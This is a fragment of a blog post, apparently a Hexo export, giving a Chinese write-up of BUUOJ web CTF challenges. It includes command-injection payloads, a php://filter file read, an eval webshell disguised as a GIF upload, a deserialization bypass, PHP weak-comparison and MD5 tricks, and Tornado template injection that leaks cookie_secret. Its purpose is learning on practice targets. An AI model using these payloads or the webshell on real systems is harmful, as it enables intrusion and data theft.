if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\")){\n        echo \"Oh no!\";\n        exit();\n    }\n    include($file); \n//flag放在了flag.php里\n?>\n</html>\n```\n\n这时候要用 php 伪协议读取 `flag.php`，`php://filter` 是 php 伪协议，`read=convert.base64-encode/resource=` 是 base64 编码，`flag.php` 是要读取的文件，所以这里的 payload 是 `secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php`，然后把返回的 base64 解码就行了。\n\n### [极客大挑战 2019]Http\n\n找到藏着的标签\n\n```html\n<a style=\"border:none;cursor:default;\" onclick=\"return false\" href=\"Secret.php\">氛围</a>\n```\n\n转到 `Secret.php`，按他提示依次改 Referer, User-Agent 和 X-Forwarded-For，然后就能看到 flag 了。改完后如下：\n\n```yaml\nGET /Secret.php HTTP/1.1\nHost: node4.buuoj.cn:25539\nUpgrade-Insecure-Requests: 1\nUser-Agent: \"Syclover\" browser\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nReferer: https://Sycsecret.buuoj.cn\nX-Forwarded-For: localhost\n```\n\n### [极客大挑战 2019]Knife\n\n蚁剑连上秒了。\n\n### [极客大挑战 2019]Upload\n\n考文件上传，只能上传图片，还过滤了 `<?`，新建一个文件写如下内容：\n\n```html\nGIF89a? <script language=\"php\">eval($_REQUEST['a'])</script>\n```\n\n然后后缀改成 `.jpg`，上传成功，然后在 burpsuite 把后缀改成 `.phtml` 重发一遍，文件存在了 `/upload` 文件夹，用蚁剑连上去就行了。\n或者上传 `.phtml`先，这时上传是失败的的，bp 抓包把 `Content-Type` 改成 `image/jpeg` 重发一遍就行了。\n\n### [ACTF2020 新生赛]Upload\n\n和上面的差不多，前端验证后缀，上传个 `.jpg` 然后 bp 改下后缀重发就行。\n\n### [极客大挑战 2019]BabySQL\n\n又是 SQL 注入，跳过。\n\n### [极客大挑战 2019]PHP\n\n盲猜有个 `www.zip`，下载下来看到 `unserialize`，反序列化的题。\n\n```php\n<?php\ninclude 'flag.php';\nerror_reporting(0);\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n    function __wakeup(){\n        $this->username = 'guest';\n    }\n    function __destruct(){\n        if ($this->password != 100) {\n            echo \"</br>NO!!!hacker!!!</br>\";\n            echo \"You name is: \";\n            echo $this->username;echo \"</br>\";\n            echo \"You password is: \";\n            echo $this->password;echo \"</br>\";\n            die();\n        }\n        if ($this->username === 'admin') {\n            global $flag;\n            echo $flag;\n        }else{\n            echo \"</br>hello my friend~~</br>sorry i can't give you the flag!\";\n            die();\n        }\n    }\n}\n?>\n```\n\n反序列化时会首先执行 `__wakeup`，然后执行 `__destruct`，但是 `__wakeup` 里把 `username` 改成了 `guest`，所以 `__destruct` 里的 `if ($this->username === 'admin')` 正常情况下永远不会成立，所以这里要绕过 `__wakeup`，在反序列化时，当前属性个数大于实际属性个数时，就会跳过 `__wakeup`，但是这个似乎是 PHP 低版本的漏洞，用高版本的 PHP 复现不出来。\n\n```php\n<?php\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n \n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n}\n$a = new Name('admin', 100);\n$b = urlencode(serialize($a));\necho $b; \n?>\n```\n\n出来一个 `O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D`，urlencode 前是 `O:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}`，所以把 2 改成 3 就行，最终的 payload 就是 `?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}`\n\n### [ACTF2020 新生赛]BackupFile\n\nwp 说用 dirsearch 嗯扫，我一通操作发现鸟蛋没扫出来，一看原来已经报 429 Too Many Requests，这 dirsearch 也是个笨比不知道歇会再扫。\n总之就是有个 `index.php.bak`，内容如下：\n\n```php\n<?php\ninclude_once \"flag.php\";\n\nif(isset($_GET['key'])) {\n    $key = $_GET['key'];\n    if(!is_numeric($key)) {\n        exit(\"Just num!\");\n    }\n    $key = intval($key);\n    $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\";\n    if($key == $str) {\n        echo $flag;\n    }\n}\nelse {\n    echo \"Try to find out source file!\";\n}\n```\n\nphp 里的 `==` 不要求类型相同，数字和混合字符串比较时，取最前面的一串数字，这里的 `str` 就只取 `123`，所以这里的 payload 是 `?key=123`。\n\n### [RoarCTF 2019]Easy Calc\n\nF12 看到说 `I've set up WAF to ensure security.`，WAF 是 Web Application Firewall 的缩写，就是一种防火墙。然后看到计算的过程是用 AJAX 发个包给 `calc.php` 去。直接访问 `calc.php`，内容如下：\n\n```php\n<?php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {\n                        die(\"what are you want to do?\");\n                }\n        }\n        eval('echo '.$str.';');\n}\n?>\n```\n\n然后发现 num 里面有字母时也会被 WAF 拦下来，比如 `?num=a` 时就不行，这时候就有个骚操作，可以在 `num` 前面加个空格或者 `+`，这样就能绕过 WAF 了，但是 PHP 在解析参数的时候会把空格或者 `+` 去掉。\n那么我们 `? num=var_dump(scandir(chr(47)))` 看下目录内容，为了绕过黑名单只能用 ASCII码，`chr(47)` 就是 `/`，也就是相当于 `ls /`，看到有个 `f1agg`，用 `file_get_contents` 读出来就行，payload 为 `? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))`。\n\n### [极客大挑战 2019]BuyFlag\n\nMENU 跳到 `pay.php`，F12 看到源码：\n\n```php\nif (isset($_POST['password'])) {\n    $password = $_POST['password'];\n    if (is_numeric($password)) {\n        echo \"password can't be number</br>\";\n    }elseif ($password == 404) {\n        echo \"Password Right!</br>\";\n    }\n}\n```\n\n又要 password 不是数字，又要 password 是 404，那还是 PHP 的弱类型比较，搞个 `404a` 传过去，发现没反应，根据他的要求再 POST 个 `money` 过去，还是没反应，看 wp 才发现有个 `user` 的 cookie 要改成 1，这时有反应了，说 `money` 太长。\nPHP 5.3 有个关于 `strcmp` 的漏洞，就是数据类型不同的时候，`strcmp` 会返回 0，所以这里的 payload 是 `?password=404a&money[]=1`，就是把 `money` 干成数组，就得到 flag了。\n\n### [BJDCTF2020]Easy MD5\n\n随便输个 `1`，一看响应头有个 hint：`Hint: select * from 'admin' where password=md5($pass,true)`，好，那就搞搞 MD5。\n首先 MD5 出来的是一个 128 位的散列值，然后 PHP 的 `md5` 函数后面的 `true` 是指返回二进制格式的散列值，但是这个二进制串会进行 ASCII 码转换成字符串，类似 python 里的 `str(long_to_bytes())`。\nwp 中选择了 `ffifdyop` 作为 payload，其 MD5 值为 `276f722736c95d99e921722cf9ed621c`，前面的 `27 6f 72 27 36` 对应的字符为 `'or'6`，这样就可以进行一个 SQL 注入，拼凑出 `select * from 'admin' where password=''or'6...'`，后面还会跟着一堆乱码，但是 `6...` 会被当成数字，所以就一定为真。\n然后跳到了 `levels91.php`，F12 看到：\n\n```php\n$a = $GET['a'];\n$b = $_GET['b'];\n\nif($a != $b && md5($a) == md5($b)){\n    // wow, glzjin wants a girl friend.\n```\n\n`$GET` 感觉是错的，真随意。后面的 if 语句有两种方法绕过，一种是找到两个不同的字符串，其 MD5 值都是 `0e` 后面跟数字，这样的话 PHP 会当成是科学计数法，其值都为 `0`，比如 `QNKCDZO` 和 `s878926199a`，传参进去后出现如下代码：\n\n```php\n<?php\nerror_reporting(0);\ninclude \"flag.php\";\n\nhighlight_file(__FILE__);\n\nif($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){\n    echo $flag;\n}\n```\n\n这里就要用第二种方法了，就是传俩数组进去，`md5` 函数会返回 `null`，然后 `null` 和 `null` 比较时会返回 `true`，而且这个方法刚才也能用，即弱比较和强比较通杀。\n\n### [护网杯 2018]easy_tornado\n\n打开一看是个目录，有 `/flag.txt`，`/welcome.txt` 和 `hints.txt`，内容分别为 `flag in /fllllllllllllag`，`render` 和 `md5(cookie_secret+md5(filename))` 打开文件的时候 url 变成了 `/file?filename=/xxx.txt&filehash=xxx`，那我想看 flag 的话应该得搞到 flag 文件的 filehash，那首先得搞到 `cookie_secret`。\n题目名字中的 tornado 是一个 Python 的 web 框架，类似 Flask，那么题目是 SSTI 注入，即 Server-Side Template Injection，服务端模板注入。先只传 `filename` 不传 `filehash`，他就急了，网页跳转到 `/error?msg=Error`，网页内容也是 `Error`，那么考虑对 `msg` 进行注入。\n小插曲：这时候太困睡觉去了，第二天再来搞这题时 BUU 在维护了，开摆！\n`msg={{1}}` 的时候回显 `1` 了，有说法，wp 说 `cookie_secret` 在 `handler.settings`，这时候 `/error?msg={{handler.settings}}` 返回了一串 `json`，其中确实有我们要找的 `cookie_secret`。\n在传 `filehash` 的时候一开始只拿 `fllllllllllllag` 去算了，结果不对，还得加上 `/`。\n","source":"_posts/BUUOJ 之 Web 刷题记.md","raw":"---\ntitle: BUUOJ 之 Web 刷题记\ndate: 2023-09-14 13:09:00\ntags: [CTF, Web]\ncategories: 学习\n---\n\n这学期好像没什么课，就想着学一下 Web ，于是就去 BUUOJ 上刷题了。（copilot 挺懂我）\n\n<!--more-->\n\n## 前言\n\n其实一开始学 CTF 的时候就想做 Web 了，但是当时密码手快毕业了，密码也简单好学，就先学密码了。\n现在密码也学了个半桶水，得着手全栈了。\n\n## 刷题\n\n### [GXYCTF2019]Ping Ping Ping\n\n题目给出一个 `?ip=`，显然是让我用 `GET` 方法传参，随便传个 `1` 返回的是 ping 的结果，看来是命令执行，我习惯性后面补个 `&&ls`，结果没反应，一看 wp 原来还能用分号的，`&&` 要上一条命令执行成功才会执行下一条，而 `;` 则是不管上一条命令是否成功都会执行下一条，所以这里用 `;` 就行了。\n\n然后难点在于正则过滤，`index.php` 内容如下：\n\n```php\n/?ip=\n<pre>PING 1 (0.0.0.1): 56 data bytes\n/?ip=\n<?php\nif(isset($_GET['ip'])){\n  $ip = $_GET['ip'];\n  if(preg_match(\"/\\&|\\/|\\?|\\*|\\<|[\\x{00}-\\x{1f}]|\\>|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match)){\n    echo preg_match(\"/\\&|\\/|\\?|\\*|\\<|[\\x{00}-\\x{20}]|\\>|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match);\n    die(\"fxck your symbol!\");\n  } else if(preg_match(\"/ /\", $ip)){\n    die(\"fxck your space!\");\n  } else if(preg_match(\"/bash/\", $ip)){\n    die(\"fxck your bash!\");\n  } else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip)){\n    die(\"fxck your flag!\");\n  }\n  $a = shell_exec(\"ping -c 4 \".$ip);\n  echo \"<pre>\";\n  print_r($a);\n}\n\n?>\n```\n\n这里过滤了空格和 flag，所以不能直接 `cat flag.php`，wp 的 payload 是\n\n```bash\n?ip=127.0.0.1;cat$IFS$1`ls`\n```\n\n`$IFS` 是空格，`$1` 是第一个参数，所以这里就是 `cat flag.php index.php`，然后就能看到 flag 了。注意这里的 `$1` 会带出 `ls` 的所有结果而不仅仅是 `flag.php`。所以 `cat` 出来的是目录下所有文件。\n\n解法二是 `echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh`，这里的 `Y2F0IGZsYWcucGhw` 是 `cat flag.php` 的 base64 编码，`-d` 是解码，然后传到 `sh` 执行。注意到 `index.php` 只过滤了 `bash`，所以这里可以用 `sh`。\n\n### [强网杯 2019]随便注\n\n最头疼的就是这些注入了，没学过 sql 语句，也没学过数据库。\n\n随便填个 1 提交后返回\n\n```sql\narray(2) {\n  [0]=>\n  string(1) \"1\"\n  [1]=>\n  string(7) \"hahahah\"\n}\n```\n\n从网上抄的 `1' or '1'='1` 不管用，有空再回来补。\n\n### [SUCTF 2019]EasySQL\n\n抄的 wp：`*,1`，也不懂，有空补。\n\n### [极客大挑战 2019]Secret File\n\nF12 看到\n\n```html\n<a id=\"master\" href=\"./Archive_room.php\" style=\"background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;\">Oh! You found me</a>\n```\n\n转到 `Archive_room.php`，有一个按钮指向 `action.php`，点了之后是一个 302 后的 `end.php`。应该是跳到 `action.php` 然后光速重定向到 `end.php`，所以没看到 `action.php` 的内容。\n用 burpsuite 抓包，发现 `action.php` 有个 `secr3t.php`，进去后是以下代码\n\n```php\n<html>\n    <title>secret</title>\n    <meta charset=\"UTF-8\">\n<?php\n    highlight_file(__FILE__);\n    error_reporting(0);\n    $file=$_GET['file'];\n    if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\")){\n        echo \"Oh no!\";\n        exit();\n    }\n    include($file); \n//flag放在了flag.php里\n?>\n</html>\n```\n\n这时候要用 php 伪协议读取 `flag.php`，`php://filter` 是 php 伪协议，`read=convert.base64-encode/resource=` 是 base64 编码，`flag.php` 是要读取的文件，所以这里的 payload 是 `secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php`，然后把返回的 base64 解码就行了。\n\n### [极客大挑战 2019]Http\n\n找到藏着的标签\n\n```html\n<a style=\"border:none;cursor:default;\" onclick=\"return false\" href=\"Secret.php\">氛围</a>\n```\n\n转到 `Secret.php`，按他提示依次改 Referer, User-Agent 和 X-Forwarded-For，然后就能看到 flag 了。改完后如下：\n\n```yaml\nGET /Secret.php HTTP/1.1\nHost: node4.buuoj.cn:25539\nUpgrade-Insecure-Requests: 1\nUser-Agent: \"Syclover\" browser\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nReferer: https://Sycsecret.buuoj.cn\nX-Forwarded-For: localhost\n```\n\n### [极客大挑战 2019]Knife\n\n蚁剑连上秒了。\n\n### [极客大挑战 2019]Upload\n\n考文件上传，只能上传图片，还过滤了 `<?`，新建一个文件写如下内容：\n\n```html\nGIF89a? <script language=\"php\">eval($_REQUEST['a'])</script>\n```\n\n然后后缀改成 `.jpg`，上传成功，然后在 burpsuite 把后缀改成 `.phtml` 重发一遍，文件存在了 `/upload` 文件夹，用蚁剑连上去就行了。\n或者上传 `.phtml`先，这时上传是失败的的，bp 抓包把 `Content-Type` 改成 `image/jpeg` 重发一遍就行了。\n\n### [ACTF2020 新生赛]Upload\n\n和上面的差不多，前端验证后缀，上传个 `.jpg` 然后 bp 改下后缀重发就行。\n\n### [极客大挑战 2019]BabySQL\n\n又是 SQL 注入，跳过。\n\n### [极客大挑战 2019]PHP\n\n盲猜有个 `www.zip`，下载下来看到 `unserialize`，反序列化的题。\n\n```php\n<?php\ninclude 'flag.php';\nerror_reporting(0);\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n    function __wakeup(){\n        $this->username = 'guest';\n    }\n    function __destruct(){\n        if ($this->password != 100) {\n            echo \"</br>NO!!!hacker!!!</br>\";\n            echo \"You name is: \";\n            echo $this->username;echo \"</br>\";\n            echo \"You password is: \";\n            echo $this->password;echo \"</br>\";\n            die();\n        }\n        if ($this->username === 'admin') {\n            global $flag;\n            echo $flag;\n        }else{\n            echo \"</br>hello my friend~~</br>sorry i can't give you the flag!\";\n            die();\n        }\n    }\n}\n?>\n```\n\n反序列化时会首先执行 `__wakeup`，然后执行 `__destruct`，但是 `__wakeup` 里把 `username` 改成了 `guest`，所以 `__destruct` 里的 `if ($this->username === 'admin')` 正常情况下永远不会成立，所以这里要绕过 `__wakeup`，在反序列化时，当前属性个数大于实际属性个数时，就会跳过 `__wakeup`，但是这个似乎是 PHP 低版本的漏洞，用高版本的 PHP 复现不出来。\n\n```php\n<?php\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n \n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n}\n$a = new Name('admin', 100);\n$b = urlencode(serialize($a));\necho $b; \n?>\n```\n\n出来一个 `O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D`，urlencode 前是 `O:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}`，所以把 2 改成 3 就行，最终的 payload 就是 `?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}`\n\n### [ACTF2020 新生赛]BackupFile\n\nwp 说用 dirsearch 嗯扫，我一通操作发现鸟蛋没扫出来，一看原来已经报 429 Too Many Requests，这 dirsearch 也是个笨比不知道歇会再扫。\n总之就是有个 `index.php.bak`，内容如下：\n\n```php\n<?php\ninclude_once \"flag.php\";\n\nif(isset($_GET['key'])) {\n    $key = $_GET['key'];\n    if(!is_numeric($key)) {\n        exit(\"Just num!\");\n    }\n    $key = intval($key);\n    $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\";\n    if($key == $str) {\n        echo $flag;\n    }\n}\nelse {\n    echo \"Try to find out source file!\";\n}\n```\n\nphp 里的 `==` 不要求类型相同，数字和混合字符串比较时，取最前面的一串数字，这里的 `str` 就只取 `123`，所以这里的 payload 是 `?key=123`。\n\n### [RoarCTF 2019]Easy Calc\n\nF12 看到说 `I've set up WAF to ensure security.`，WAF 是 Web Application Firewall 的缩写，就是一种防火墙。然后看到计算的过程是用 AJAX 发个包给 `calc.php` 去。直接访问 `calc.php`，内容如下：\n\n```php\n<?php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {\n                        die(\"what are you want to do?\");\n                }\n        }\n        eval('echo '.$str.';');\n}\n?>\n```\n\n然后发现 num 里面有字母时也会被 WAF 拦下来，比如 `?num=a` 时就不行，这时候就有个骚操作，可以在 `num` 前面加个空格或者 `+`，这样就能绕过 WAF 了，但是 PHP 在解析参数的时候会把空格或者 `+` 去掉。\n那么我们 `? num=var_dump(scandir(chr(47)))` 看下目录内容，为了绕过黑名单只能用 ASCII码，`chr(47)` 就是 `/`，也就是相当于 `ls /`，看到有个 `f1agg`，用 `file_get_contents` 读出来就行，payload 为 `? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))`。\n\n### [极客大挑战 2019]BuyFlag\n\nMENU 跳到 `pay.php`，F12 看到源码：\n\n```php\nif (isset($_POST['password'])) {\n    $password = $_POST['password'];\n    if (is_numeric($password)) {\n        echo \"password can't be number</br>\";\n    }elseif ($password == 404) {\n        echo \"Password Right!</br>\";\n    }\n}\n```\n\n又要 password 不是数字，又要 password 是 404，那还是 PHP 的弱类型比较，搞个 `404a` 传过去，发现没反应，根据他的要求再 POST 个 `money` 过去，还是没反应，看 wp 才发现有个 `user` 的 cookie 要改成 1，这时有反应了，说 `money` 太长。\nPHP 5.3 有个关于 `strcmp` 的漏洞，就是数据类型不同的时候，`strcmp` 会返回 0，所以这里的 payload 是 `?password=404a&money[]=1`，就是把 `money` 干成数组，就得到 flag了。\n\n### [BJDCTF2020]Easy MD5\n\n随便输个 `1`，一看响应头有个 hint：`Hint: select * from 'admin' where password=md5($pass,true)`，好，那就搞搞 MD5。\n首先 MD5 出来的是一个 128 位的散列值，然后 PHP 的 `md5` 函数后面的 `true` 是指返回二进制格式的散列值，但是这个二进制串会进行 ASCII 码转换成字符串，类似 python 里的 `str(long_to_bytes())`。\nwp 中选择了 `ffifdyop` 作为 payload，其 MD5 值为 `276f722736c95d99e921722cf9ed621c`，前面的 `27 6f 72 27 36` 对应的字符为 `'or'6`，这样就可以进行一个 SQL 注入，拼凑出 `select * from 'admin' where password=''or'6...'`，后面还会跟着一堆乱码，但是 `6...` 会被当成数字，所以就一定为真。\n然后跳到了 `levels91.php`，F12 看到：\n\n```php\n$a = $GET['a'];\n$b = $_GET['b'];\n\nif($a != $b && md5($a) == md5($b)){\n    // wow, glzjin wants a girl friend.\n```\n\n`$GET` 感觉是错的，真随意。后面的 if 语句有两种方法绕过，一种是找到两个不同的字符串，其 MD5 值都是 `0e` 后面跟数字，这样的话 PHP 会当成是科学计数法，其值都为 `0`，比如 `QNKCDZO` 和 `s878926199a`，传参进去后出现如下代码：\n\n```php\n<?php\nerror_reporting(0);\ninclude \"flag.php\";\n\nhighlight_file(__FILE__);\n\nif($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){\n    echo $flag;\n}\n```\n\n这里就要用第二种方法了，就是传俩数组进去，`md5` 函数会返回 `null`，然后 `null` 和 `null` 比较时会返回 `true`，而且这个方法刚才也能用，即弱比较和强比较通杀。\n\n### [护网杯 2018]easy_tornado\n\n打开一看是个目录，有 `/flag.txt`，`/welcome.txt` 和 `hints.txt`，内容分别为 `flag in /fllllllllllllag`，`render` 和 `md5(cookie_secret+md5(filename))` 打开文件的时候 url 变成了 `/file?filename=/xxx.txt&filehash=xxx`，那我想看 flag 的话应该得搞到 flag 文件的 filehash，那首先得搞到 `cookie_secret`。\n题目名字中的 tornado 是一个 Python 的 web 框架，类似 Flask，那么题目是 SSTI 注入，即 Server-Side Template Injection，服务端模板注入。先只传 `filename` 不传 `filehash`，他就急了，网页跳转到 `/error?msg=Error`，网页内容也是 `Error`，那么考虑对 `msg` 进行注入。\n小插曲：这时候太困睡觉去了，第二天再来搞这题时 BUU 在维护了，开摆！\n`msg={{1}}` 的时候回显 `1` 了，有说法，wp 说 `cookie_secret` 在 `handler.settings`，这时候 `/error?msg={{handler.settings}}` 返回了一串 `json`，其中确实有我们要找的 `cookie_secret`。\n在传 `filehash` 的时候一开始只拿 `fllllllllllllag` 去算了，结果不对，还得加上 `/`。\n","slug":"BUUOJ 之 Web 刷题记","published":1,"updated":"2023-09-23T18:14:41.436Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zocv000a7slz8y0q7hle","content":"<p>这学期好像没什么课，就想着学一下 Web ，于是就去 BUUOJ 上刷题了。（copilot 挺懂我）</p>\n<span id=\"more\"></span>\n\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>其实一开始学 CTF 的时候就想做 Web 了，但是当时密码手快毕业了，密码也简单好学，就先学密码了。<br>现在密码也学了个半桶水，得着手全栈了。</p>\n<h2 id=\"刷题\"><a href=\"#刷题\" class=\"headerlink\" title=\"刷题\"></a>刷题</h2><h3 id=\"GXYCTF2019-Ping-Ping-Ping\"><a href=\"#GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"[GXYCTF2019]Ping Ping Ping\"></a>[GXYCTF2019]Ping Ping Ping</h3><p>题目给出一个 <code>?ip=</code>，显然是让我用 <code>GET</code> 方法传参，随便传个 <code>1</code> 返回的是 ping 的结果，看来是命令执行，我习惯性后面补个 <code>&amp;&amp;ls</code>，结果没反应，一看 wp 原来还能用分号的，<code>&amp;&amp;</code> 要上一条命令执行成功才会执行下一条，而 <code>;</code> 则是不管上一条命令是否成功都会执行下一条，所以这里用 <code>;</code> 就行了。</p>\n<p>然后难点在于正则过滤，<code>index.php</code> 内容如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?ip=</span><br><span class=\"line\">&lt;pre&gt;PING <span class=\"number\">1</span> (<span class=\"number\">0.0</span>.<span class=\"number\">0.1</span>): <span class=\"number\">56</span> data bytes</span><br><span class=\"line\">/?ip=</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;ip&#x27;</span>]))&#123;</span><br><span class=\"line\">  <span class=\"variable\">$ip</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;ip&#x27;</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;</span>, <span class=\"variable\">$ip</span>, <span class=\"variable\">$match</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;</span>, <span class=\"variable\">$ip</span>, <span class=\"variable\">$match</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;fxck your symbol!&quot;</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/ /&quot;</span>, <span class=\"variable\">$ip</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;fxck your space!&quot;</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/bash/&quot;</span>, <span class=\"variable\">$ip</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;fxck your bash!&quot;</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class=\"variable\">$ip</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;fxck your flag!&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">shell_exec</span>(<span class=\"string\">&quot;ping -c 4 &quot;</span>.<span class=\"variable\">$ip</span>);</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>这里过滤了空格和 flag，所以不能直接 <code>cat flag.php</code>，wp 的 payload 是</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ip=127.0.0.1;<span class=\"built_in\">cat</span>$IFS<span class=\"variable\">$1</span>`<span class=\"built_in\">ls</span>`</span><br></pre></td></tr></table></figure>\n\n<p><code>$IFS</code> 是空格，<code>$1</code> 是第一个参数，所以这里就是 <code>cat flag.php index.php</code>，然后就能看到 flag 了。注意这里的 <code>$1</code> 会带出 <code>ls</code> 的所有结果而不仅仅是 <code>flag.php</code>。所以 <code>cat</code> 出来的是目录下所有文件。</p>\n<p>解法二是 <code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code>，这里的 <code>Y2F0IGZsYWcucGhw</code> 是 <code>cat flag.php</code> 的 base64 编码，<code>-d</code> 是解码，然后传到 <code>sh</code> 执行。注意到 <code>index.php</code> 只过滤了 <code>bash</code>，所以这里可以用 <code>sh</code>。</p>\n<h3 id=\"强网杯-2019-随便注\"><a href=\"#强网杯-2019-随便注\" class=\"headerlink\" title=\"[强网杯 2019]随便注\"></a>[强网杯 2019]随便注</h3><p>最头疼的就是这些注入了，没学过 sql 语句，也没学过数据库。</p>\n<p>随便填个 1 提交后返回</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 